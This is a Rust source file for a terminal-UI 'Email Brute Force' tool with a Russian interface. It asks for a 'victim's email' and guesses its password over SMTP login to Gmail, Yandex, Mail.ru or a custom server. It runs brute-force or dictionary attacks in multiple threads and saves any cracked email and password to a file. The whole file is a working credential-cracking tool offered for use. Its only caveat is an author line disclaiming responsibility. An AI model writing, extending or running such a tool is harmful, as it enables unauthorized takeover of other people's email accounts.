use cursive::traits::*;
use cursive::views::{Dialog, EditView, LinearLayout, SelectView, TextView, Checkbox};
use cursive::Cursive;
use lettre::transport::smtp::authentication::Credentials;
use lettre::{Message, SmtpTransport, Transport};
use std::fs::File;
use std::io::{BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};
const CHARSET: &str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!#$%&'*+-/=?^_`{|}~;";
fn try_login(server: &str, port: u16, protocol: &str, user: &str, password: &str) -> bool {
    let creds = Credentials::new(user.to_string(), password.to_string());
    let mailer = if protocol == "ssl" {
        match SmtpTransport::relay(server) {
            Ok(builder) => builder.port(port).credentials(creds).build(),
            Err(_) => return false,
        }
    } else {
        match SmtpTransport::starttls_relay(server) {
            Ok(builder) => builder.port(port).credentials(creds).build(),
            Err(_) => return false,
        }
    };
    let email = Message::builder()
        .from(user.parse().unwrap())
        .to(user.parse().unwrap())
        .subject("Test")
        .body("Test".to_string());

    if let Ok(email) = email {
        mailer.send(&email).is_ok()
    } else {
        false
    }
}
fn generate_passwords(chars: &[char], min_len: usize, max_len: usize, callback: &mut dyn FnMut(String)) {
    for len in min_len..=max_len {
        let mut current = vec![' '; len];
        fn rec(chars: &[char], pos: usize, len: usize, current: &mut [char], callback: &mut dyn FnMut(String)) {
            if pos == len {
                callback(current.iter().collect());
                return;
            }
            for &ch in chars {
                current[pos] = ch;
                rec(chars, pos + 1, len, current, callback);
            }
        }
        rec(chars, 0, len, &mut current, callback);
    }
}
fn start_brute_force_attack(
    server: String,
    port: u16,
    protocol: String,
    user: String,
    min_len: usize,
    thread_count: usize,
    delay: f64,
    show_failed: bool,
    cb_sink: cursive::CbSink,
) {
    let max_len = 6;
    let chars: Vec<char> = CHARSET.chars().collect();
    let found = Arc::new(Mutex::new(false));
    let charset = Arc::new(chars);
    let attempt_counter = Arc::new(Mutex::new(0u64));
    let start_time = Instant::now();
    let mut handles = Vec::new();

    for _ in 0..thread_count {
        let server = server.clone();
        let protocol = protocol.clone();
        let user = user.clone();
        let found = Arc::clone(&found);
        let charset = Arc::clone(&charset);
        let attempt_counter = Arc::clone(&attempt_counter);
        let cb_sink = cb_sink.clone();

        let handle = thread::spawn(move || {
            generate_passwords(&charset, min_len, max_len, &mut |password: String| {
                {
                    let mut counter = attempt_counter.lock().unwrap();
                    *counter += 1;
                }
                if *found.lock().unwrap() {
                    return;
                }
                if delay > 0.0 {
                    thread::sleep(Duration::from_micros((delay * 1_000_000.0) as u64));
                }
                if try_login(&server, port, &protocol, &user, &password) {
                    *found.lock().unwrap() = true;
                    let pass_ui = password.clone();
                    let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
                        s.add_layer(Dialog::info(format!("[+] Пароль подобран: {}", pass_ui)));
                    }));
                    if let Ok(mut file) = File::create("password_cracked.txt") {
                        let _ = writeln!(file, "Емейл: {}", user);
                        let _ = writeln!(file, "Пароль: {}", password);
                    }
                } else {
                    if show_failed {
                        let pass_ui = password.clone();
                        let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
                            s.add_layer(Dialog::info(format!("[!] пароль неверен: {}", pass_ui)));
                        }));
                    }
                }
            });
        });
        handles.push(handle);
    }
    for handle in handles {
        let _ = handle.join();
    }
    let elapsed = start_time.elapsed();
    let attempts = *attempt_counter.lock().unwrap();
    let summary = format!("Атака завершена. Попробовано {} вариантов за {:.2?}.", attempts, elapsed);
    let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
        s.add_layer(Dialog::info(summary));
    }));
}
fn start_dictionary_attack(
    server: String,
    port: u16,
    protocol: String,
    user: String,
    dict_path: String,
    thread_count: usize,
    show_failed: bool,
    cb_sink: cursive::CbSink,
) {
    let file = match File::open(&dict_path) {
        Ok(f) => f,
        Err(_) => {
            let _ = cb_sink.send(Box::new(|s: &mut Cursive| {
                s.add_layer(Dialog::info("Не удалось открыть словарь."));
            }));
            return;
        }
    };
    let reader = BufReader::new(file);
    let passwords: Vec<String> = reader.lines().filter_map(|line| line.ok()).collect();
    let found = Arc::new(Mutex::new(false));
    let attempt_counter = Arc::new(Mutex::new(0u64));
    let start_time = Instant::now();
    let chunk_size = (passwords.len() + thread_count - 1) / thread_count;
    let mut handles = Vec::new();
    for chunk in passwords.chunks(chunk_size) {
        let chunk = chunk.to_owned();
        let server = server.clone();
        let protocol = protocol.clone();
        let user = user.clone();
        let found = Arc::clone(&found);
        let attempt_counter = Arc::clone(&attempt_counter);
        let cb_sink = cb_sink.clone();

        let handle = thread::spawn(move || {
            for password in chunk {
                {
                    let mut counter = attempt_counter.lock().unwrap();
                    *counter += 1;
                }
                if *found.lock().unwrap() {
                    return;
                }
                let trimmed = password.trim().to_string();
                if try_login(&server, port, &protocol, &user, &trimmed) {
                    *found.lock().unwrap() = true;
                    let pass_ui = trimmed.clone();
                    let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
                        s.add_layer(Dialog::info(format!("[+] Пароль подобран: {}", pass_ui)));
                    }));
                    if let Ok(mut file) = File::create("password_cracked.txt") {
                        let _ = writeln!(file, "Емейл: {}", user);
                        let _ = writeln!(file, "Пароль: {}", trimmed);
                    }
                    return;
                } else {
                    if show_failed {
                        let pass_ui = trimmed.clone();
                        let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
                            s.add_layer(Dialog::info(format!("[!] пароль неверен: {}", pass_ui)));
                        }));
                    }
                }
            }
        });
        handles.push(handle);
    }
    for handle in handles {
        let _ = handle.join();
    }
    let elapsed = start_time.elapsed();
    let attempts = *attempt_counter.lock().unwrap();
    let summary = format!("Атака завершена. Попробовано {} вариантов за {:.2?}.", attempts, elapsed);
    let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
        s.add_layer(Dialog::info(summary));
    }));
}

fn benchmark_bruteforce(cb_sink: cursive::CbSink) {
    let chars: Vec<char> = CHARSET.chars().collect();
    let min_len = 1;
    let max_len = 4;
    let mut count = 0u64;
    let start = Instant::now();
    generate_passwords(&chars, min_len, max_len, &mut |_: String| {count += 1;});
    let elapsed = start.elapsed();
    let speed = count as f64 / elapsed.as_secs_f64();
    let summary = format!("Benchmark: сгенерировано {} комбинаций за {:.2?} ({} попыток/сек)", count, elapsed, speed as u64);
    let _ = cb_sink.send(Box::new(move |s: &mut Cursive| {
        s.add_layer(Dialog::info(summary));
    }));
}
fn main() {
    let mut siv = cursive::default();

    let email_edit = EditView::new().with_name("email").fixed_width(30);

    
    let use_dictionary = LinearLayout::horizontal()
        .child(TextView::new("Использовать словарь: "))
        .child(Checkbox::new().with_name("use_dictionary"));

    let mut smtp_server_select: SelectView<String> = SelectView::new();
    smtp_server_select.add_item("Gmail", "Gmail".to_string());
    smtp_server_select.add_item("Yandex", "Yandex".to_string());
    smtp_server_select.add_item("Mail.ru", "Mail.ru".to_string());
    smtp_server_select.add_item("Custom", "Custom".to_string());
    smtp_server_select.set_selection(0);
    let smtp_server_select = smtp_server_select.with_name("smtp_server").fixed_width(20);

    // Поля для кастомного SMTP (видны при выборе Custom)
    let custom_server_edit = EditView::new().with_name("custom_server").fixed_width(30);
    let custom_port_edit = EditView::new().with_name("custom_port").fixed_width(10);
    let custom_protocol_edit = EditView::new().with_name("custom_protocol").fixed_width(10);

    // Поля для brute force и словарной атаки
    let min_pass_edit = EditView::new().with_name("min_pass").fixed_width(5);
    let dict_path_edit = EditView::new().with_name("dict_path").fixed_width(30);
    
    // Количество потоков
    let thread_count_edit = EditView::new().content("1").with_name("thread_count").fixed_width(5);

    // Чекбокс для модификаций RPI
    let use_rpi_mods = LinearLayout::horizontal()
        .child(TextView::new("Использовать модификации RPI: "))
        .child(Checkbox::new().with_name("use_rpi_mods"));

    // Чекбокс для показа неудачных попыток
    let show_failed = LinearLayout::horizontal()
        .child(TextView::new("Показывать неудачные попытки: "))
        .child(Checkbox::new().with_name("show_failed"));

    // Собираем интерфейс
    let layout = LinearLayout::vertical()
        .child(TextView::new("Введите почту жертвы:"))
        .child(email_edit)
        .child(use_dictionary)
        .child(TextView::new("SMTP сервер:"))
        .child(smtp_server_select)
        .child(TextView::new("Если Custom, введите SMTP сервер:"))
        .child(custom_server_edit)
        .child(TextView::new("Порт (Custom):"))
        .child(custom_port_edit)
        .child(TextView::new("Протокол (tls/ssl) (Custom):"))
        .child(custom_protocol_edit)
        .child(TextView::new("Минимальный размер пароля (Brute Force):"))
        .child(min_pass_edit)
        .child(TextView::new("Путь до словаря (Dictionary):"))
        .child(dict_path_edit)
        .child(TextView::new("Количество потоков:"))
        .child(thread_count_edit)
        .child(use_rpi_mods)
        .child(show_failed);
    siv.add_layer(
        Dialog::new()
            .title("Email Brute Force")
            .content(layout)
            .button("Начать атаку", |s| {
                let email = s
                    .call_on_name("email", |view: &mut EditView| view.get_content())
                    .unwrap()
                    .to_string();
                let use_dictionary = s
                    .call_on_name("use_dictionary", |view: &mut Checkbox| view.is_checked())
                    .unwrap();
                let smtp_server = s
                    .call_on_name("smtp_server", |view: &mut SelectView<String>| {
                        view.selection().unwrap().clone()
                    })
                    .unwrap();
                let thread_count_str = s
                    .call_on_name("thread_count", |view: &mut EditView| view.get_content())
                    .unwrap();
                let thread_count = thread_count_str.parse::<usize>().unwrap_or(1);
                let use_rpi_mods = s
                    .call_on_name("use_rpi_mods", |view: &mut Checkbox| view.is_checked())
                    .unwrap();
                let show_failed = s
                    .call_on_name("show_failed", |view: &mut Checkbox| view.is_checked())
                    .unwrap();
                let delay = if use_rpi_mods { 0.0002 } else { 0.0 };

                let (server_addr, port, protocol) = match smtp_server.as_str() {
                    "Gmail" => ("smtp.gmail.com".to_string(), 587, "tls".to_string()),
                    "Yandex" => ("smtp.yandex.ru".to_string(), 465, "ssl".to_string()),
                    "Mail.ru" => ("smtp.mail.ru".to_string(), 465, "ssl".to_string()),
                    "Custom" => {
                        let custom_server = s
                            .call_on_name("custom_server", |view: &mut EditView| view.get_content())
                            .unwrap()
                            .to_string();
                        let custom_port_str = s
                            .call_on_name("custom_port", |view: &mut EditView| view.get_content())
                            .unwrap()
                            .to_string();
                        let custom_port = custom_port_str.parse::<u16>().unwrap_or(25);
                        let custom_protocol = s
                            .call_on_name("custom_protocol", |view: &mut EditView| view.get_content())
                            .unwrap()
                            .to_string()
                            .to_lowercase();
                        (custom_server, custom_port, custom_protocol)
                    }
                    _ => ("smtp.gmail.com".to_string(), 587, "tls".to_string()),
                };

                let cb_sink = s.cb_sink().clone();

                if use_dictionary {
                    let dict_path = s
                        .call_on_name("dict_path", |view: &mut EditView| view.get_content())
                        .unwrap()
                        .to_string();
                    let email_clone = email.clone();
                    let server_addr_clone = server_addr.clone();
                    let protocol_clone = protocol.clone();
                    thread::spawn(move || {
                        start_dictionary_attack(
                            server_addr_clone,
                            port,
                            protocol_clone,
                            email_clone,
                            dict_path,
                            thread_count,
                            show_failed,
                            cb_sink,
                        );
                    });
                } else {
                    let min_pass_str = s
                        .call_on_name("min_pass", |view: &mut EditView| view.get_content())
                        .unwrap();
                    let min_pass = min_pass_str.parse::<usize>().unwrap_or(1);
                    let email_clone = email.clone();
                    let server_addr_clone = server_addr.clone();
                    let protocol_clone = protocol.clone();
                    thread::spawn(move || {
                        start_brute_force_attack(
                            server_addr_clone,
                            port,
                            protocol_clone,
                            email_clone,
                            min_pass,
                            thread_count,
                            delay,
                            show_failed,
                            cb_sink,
                        );
                    });
                }
            })
            .button("Benchmark", |s| {
                let cb_sink = s.cb_sink().clone();
                thread::spawn(move || {
                    benchmark_bruteforce(cb_sink);
                });
            })
            .button("Авторство", |s| {
                s.add_layer(Dialog::info("Автор - BITIW, страница github - https://github.com/BITIW/LazyBrut, ответственности за действия автор не несёт"));
            }),
    );

    siv.run();
}